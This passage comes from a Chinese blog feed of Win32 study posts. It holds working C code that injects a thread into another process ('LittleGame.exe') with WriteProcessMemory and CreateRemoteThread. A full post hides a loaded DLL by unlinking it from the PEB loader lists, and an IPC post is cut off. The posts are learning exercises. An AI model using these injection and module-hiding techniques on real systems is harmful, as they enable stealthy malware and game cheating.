punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre></pre></td></tr><tr><td data-num=\"184\"></td><td><pre></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>\t<span class=\"token function\">WriteProcessMemory</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>\t\thProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>\t\tMemAddressOfThreadProc<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>\t\t<span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span>dwFunAddr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>\t\t<span class=\"token number\">0x400</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>\t<span class=\"token comment\">// 拷贝参数</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>\t<span class=\"token function\">WriteProcessMemory</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>\t\thProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>\t\tMemAddressOfParam<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>\t\t<span class=\"token operator\">&amp;</span>cfParam<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>\t\t<span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>CreateFileParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>\t<span class=\"token comment\">// 创建远程线程</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>\tDWORD dwThreadId<span class=\"token punctuation\">;</span><span class=\"token comment\">// 返回线程 id, 失败则为 NULL</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>\t<span class=\"token comment\">// 如果成功，返回新线程句柄，失败则为 NULL</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>\tHANDLE hThread <span class=\"token operator\">=</span> <span class=\"token function\">CreateRemoteThread</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>\t\thProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre>\t\t<span class=\"token punctuation\">(</span>LPTHREAD_START_ROUTINE<span class=\"token punctuation\">)</span>MemAddressOfThreadProc<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>\t\tMemAddressOfParam<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>\t\t<span class=\"token operator\">&amp;</span>dwThreadId</pre></td></tr><tr><td data-num=\"214\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hThread <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateRemoteThread Error!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>\t\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hModule<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>\t<span class=\"token comment\">//. 关闭资源</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hThread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre></pre></td></tr><tr><td data-num=\"228\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>\tLPCTSTR CreateFileName <span class=\"token operator\">=</span>  L<span class=\"token string\">\"F:\\\\000Users\\\\Desktop\\\\test.txt\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"230\"></td><td><pre>\t<span class=\"token function\">RemoteCreateFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"231\"></td><td><pre>\t\t<span class=\"token function\">ByNameGetPid</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"LittleGame.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"232\"></td><td><pre>\t\tCreateFileName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"233\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"234\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>写代码并不复杂，运行的时候碰到了很多问题。</p>\n<p>搞了整整一天，还重写了几次，VS2019 的坑也踩了好多。最后功夫不负有心人：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>理解了海哥说的话：了解 C 和硬编码后，Win32 汇编能做的，C 一样能做。</p>\n",
            "tags": [
                "Win32",
                "代码注入"
            ]
        },
        {
            "id": "https://self-ferry.github.io/WinDLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F/",
            "url": "https://self-ferry.github.io/WinDLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F/",
            "title": "WinDLL注入之模块隐藏",
            "date_published": "2021-07-20T12:51:57.000Z",
            "content_html": "<h1 id=\"模块隐藏的实现原理\"><a class=\"anchor\" href=\"#模块隐藏的实现原理\">#</a> 模块隐藏的实现原理</h1>\n<p>普通 API 查找模块实现思路：其通过查询在 R3 中的 PEB (Process Environment Block 进程环境块) 与 TEB (Thread Environment Block 进程环境块) 来找到一个双向链表，通过遍历双向链表中某一成员 (字符串) 来查找全部模块。</p>\n<p>模块隐藏实现思路：在 R3 层的模块隐藏，我们需要做的就是将其该链表断链，将某一模块从这个双向链表中摘除，这样再调用传统的 API 时就会搜索不到。</p>\n<h1 id=\"结构体成员详细介绍\"><a class=\"anchor\" href=\"#结构体成员详细介绍\">#</a> 结构体成员详细介绍</h1>\n<h2 id=\"teb结构体-内存地址为-fs0-处\"><a class=\"anchor\" href=\"#teb结构体-内存地址为-fs0-处\">#</a> TEB 结构体 -- 内存地址为 fs:[0] 处。</h2>\n<p>使用 Windbg 的 &quot;dt _TEB&quot; 命令来查看 TEB 结构体</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h3 id=\"通过olldbg查看该结构体\"><a class=\"anchor\" href=\"#通过olldbg查看该结构体\">#</a> 通过 olldbg 查看该结构体</h3>\n<p>打开任意进程，在寄存器窗口找到 fs:[0]，查看其内存地址。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>在内存窗口使用命令 &quot;db 29E000&quot; 跳转到该内存，使用地址格式 (长型 - 地址) 显示。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h2 id=\"peb结构体-fs0x30\"><a class=\"anchor\" href=\"#peb结构体-fs0x30\">#</a> PEB 结构体 -- fs:[0x30]</h2>\n<p>使用 Windbg 指令 dt _PEB 查看 PEB 结构体，重点关注最后一个 进程加载信息表。</p>\n<p>查看 _PEB_LDR_DATA 进程加载信息表 的结构体</p>\n<p>重点关注 0x00c 处的指针，其指向 _PEB_LDR_DATA 这个结构体。</p>\n<p>在这个结构体中 0x00c、0x014、0x01c 分别表示：模块加载顺序、加载后在内存中的顺序、模块初始化的顺序。</p>\n<p>它们都是一个双向链表指针，其指向_LDR_DATA_TABLE_ENTRY 结构体中的三个成员，而 _LDR_DATA_TABLE_ENTRY 中存储着就是关于有关模块信息的元素 (比如模块名等)</p>\n<p>先了解一下 Unicode 结构体</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>这是 PEB 中存储着我们模块名称的数据在哪个地方。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h3 id=\"使用olldbg来查看查找首先加载模块的模块名称\"><a class=\"anchor\" href=\"#使用olldbg来查看查找首先加载模块的模块名称\">#</a> 使用 olldbg 来查看查找首先加载模块的模块名称</h3>\n<blockquote>\n<p>TEB-&gt;PEB-&gt; InLoadOrderModuleList -&gt; BaseDllName</p>\n</blockquote>\n<p>接之前 TEB 内容查找到 PEB 的所在位置 fs:[0x30]。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>进入 PEB 后找 0x0c 的位置，接着在内存窗口跟随。</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<p>进入后我们随便选择三个链表中的一个跟随，我这里选择了第一个</p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<p>进入后即可看到如下内容</p>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<p>可以在通过 <code>_LIST_ENTRY</code>  可以遍历前一个模块的内容和下一个模块的内容</p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<p>跟随</p>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<h1 id=\"代码实现断链\"><a class=\"anchor\" href=\"#代码实现断链\">#</a> 代码实现断链</h1>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">/* 所需要的结构体</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>1. _LDR_DATA_TABLE_ENTRY 链表指向数据</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>2. _PEB_LDR_DATA 表示其 PEB0x 处指向的数据表</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>3. _LIST_ENTRY 指针指向的链表</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LSA_UNICODE_STRING</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    USHORT Length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    USHORT MaximumLength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    PWSTR  Buffer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>UNICODE_STRING<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> PUNICODE_STRING<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_PEB_LDR_DATA</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    DWORD Length<span class=\"token punctuation\">;</span> <span class=\"token comment\">// +0x00</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">bool</span> Initialized<span class=\"token punctuation\">;</span> <span class=\"token comment\">// +0x04</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    PVOID SsHandle<span class=\"token punctuation\">;</span> <span class=\"token comment\">// +0x08</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    LIST_ENTRY InLoadOrderModuleList<span class=\"token punctuation\">;</span> <span class=\"token comment\">// +0x0c</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    LIST_ENTRY InMemoryOrderModuleList<span class=\"token punctuation\">;</span> <span class=\"token comment\">// +0x14</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    LIST_ENTRY InInitializationOrderModuleList<span class=\"token punctuation\">;</span><span class=\"token comment\">// +0x1c</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span> PEB_LDR_DATA<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> PPEB_LDR_DATA<span class=\"token punctuation\">;</span> <span class=\"token comment\">// +0x24</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_LDR_MODULE</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    LIST_ENTRY          InLoadOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    LIST_ENTRY          InMemoryOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    LIST_ENTRY          InInitializationOrderModuleList<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">void</span><span class=\"token operator\">*</span> BaseAddress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">void</span><span class=\"token operator\">*</span> EntryPoint<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    ULONG               SizeOfImage<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    UNICODE_STRING   FullDllName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    UNICODE_STRING      BaseDllName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    ULONG               Flags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    SHORT               LoadCount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    SHORT               TlsIndex<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    HANDLE              SectionHandle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    ULONG               CheckSum<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    ULONG               TimeDateStamp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span> LDR_MODULE<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> PLDR_MODULE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">// 所谓模块句柄，即该模块的入口地址</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">hide_module</span><span class=\"token punctuation\">(</span>LPCSTR szDllName<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    HMODULE hMod <span class=\"token operator\">=</span> <span class=\"token function\">GetModuleHandleA</span><span class=\"token punctuation\">(</span>szDllName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    PLIST_ENTRY Head<span class=\"token punctuation\">,</span> Cur<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    PPEB_LDR_DATA ldr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    PLDR_MODULE ldm<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    __asm</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        mov eax<span class=\"token punctuation\">,</span> fs<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        mov ecx<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>eax <span class=\"token operator\">+</span> <span class=\"token number\">0x0c</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">//Ldr</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        mov ldr<span class=\"token punctuation\">,</span> ecx</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    Head <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>ldr<span class=\"token operator\">-></span>InLoadOrderModuleList<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    Cur <span class=\"token operator\">=</span> Head<span class=\"token operator\">-></span>Flink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        ldm <span class=\"token operator\">=</span> <span class=\"token function\">CONTAINING_RECORD</span><span class=\"token punctuation\">(</span>Cur<span class=\"token punctuation\">,</span> LDR_MODULE<span class=\"token punctuation\">,</span> InLoadOrderModuleList<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hMod <span class=\"token operator\">==</span> ldm<span class=\"token operator\">-></span>BaseAddress<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token comment\">// 三个链表同时给断掉</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            ldm<span class=\"token operator\">-></span>InLoadOrderModuleList<span class=\"token punctuation\">.</span>Blink<span class=\"token operator\">-></span>Flink <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                ldm<span class=\"token operator\">-></span>InLoadOrderModuleList<span class=\"token punctuation\">.</span>Flink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            ldm<span class=\"token operator\">-></span>InLoadOrderModuleList<span class=\"token punctuation\">.</span>Flink<span class=\"token operator\">-></span>Blink <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                ldm<span class=\"token operator\">-></span>InLoadOrderModuleList<span class=\"token punctuation\">.</span>Blink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            ldm<span class=\"token operator\">-></span>InInitializationOrderModuleList<span class=\"token punctuation\">.</span>Blink<span class=\"token operator\">-></span>Flink <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                ldm<span class=\"token operator\">-></span>InInitializationOrderModuleList<span class=\"token punctuation\">.</span>Flink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            ldm<span class=\"token operator\">-></span>InInitializationOrderModuleList<span class=\"token punctuation\">.</span>Flink<span class=\"token operator\">-></span>Blink <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                ldm<span class=\"token operator\">-></span>InInitializationOrderModuleList<span class=\"token punctuation\">.</span>Blink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>            <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>            ldm<span class=\"token operator\">-></span>InMemoryOrderModuleList<span class=\"token punctuation\">.</span>Blink<span class=\"token operator\">-></span>Flink <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                ldm<span class=\"token operator\">-></span>InMemoryOrderModuleList<span class=\"token punctuation\">.</span>Flink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>            ldm<span class=\"token operator\">-></span>InMemoryOrderModuleList<span class=\"token punctuation\">.</span>Flink<span class=\"token operator\">-></span>Blink <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                ldm<span class=\"token operator\">-></span>InMemoryOrderModuleList<span class=\"token punctuation\">.</span>Blink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        Cur <span class=\"token operator\">=</span> Cur<span class=\"token operator\">-></span>Flink<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>Head <span class=\"token operator\">!=</span> Cur<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token comment\">// 通过模块名，来获取模块句柄</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"****按任意键隐藏模块*****\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    LPCSTR lpDllName <span class=\"token operator\">=</span> <span class=\"token string\">\"kernel32.dll\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token function\">hide_module</span><span class=\"token punctuation\">(</span>lpDllName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"****隐藏模块完成*****\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vb25ldHJhaW5lZS9wLzExNjc0MjExLmh0bWw=\">https://www.cnblogs.com/onetrainee/p/11674211.html</span></p>\n",
            "tags": [
                "Win32",
                "TEB",
                "PEB",
                "R3层断链"
            ]
        },
        {
            "id": "https://self-ferry.github.io/WinDLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/",
            "url": "https://self-ferry.github.io/WinDLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/",
            "title": "WinDLL注入之进程间通信",
            "date_published": "2021-07-20T12:50:13.000Z",
            "content_html": "<h1 id=\"dll注入之进程间通信\"><a class=\"anchor\" href=\"#dll注入之进程间通信\">#</a> DLL 注入之进程间通信</h1>\n<h2 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h2>\n<p>写一个小程序，模拟游戏。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">recover</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"**********回血**********\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">seckill</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"**********秒杀**********\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">teleport</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token 